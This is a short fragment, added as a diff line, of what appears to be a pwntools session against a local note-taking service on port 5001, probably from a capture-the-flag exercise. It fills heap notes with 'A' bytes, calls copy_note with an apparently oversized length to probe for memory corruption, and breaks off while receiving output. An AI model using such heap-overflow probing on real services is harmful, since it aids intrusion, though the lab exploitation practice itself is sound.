@@ -1,0 +1,1 @@
+27.0.0.1 [+] Opening connection to 127.0.0.1 on port 5001: Done >>> write_note ( ' A ' * 200 ) >>> write_note ( ' A ' * 200 ) >>> write_note ( ' A ' * 200 ) >>> write_note ( ' A ' * 200 ) >>> write_note ( ' A ' * 200 ) >>> write_note ( ' A ' * 24 ) >>> copy_note ( 1024 , 32 ) >>> resp = show_note () [x] Receiving
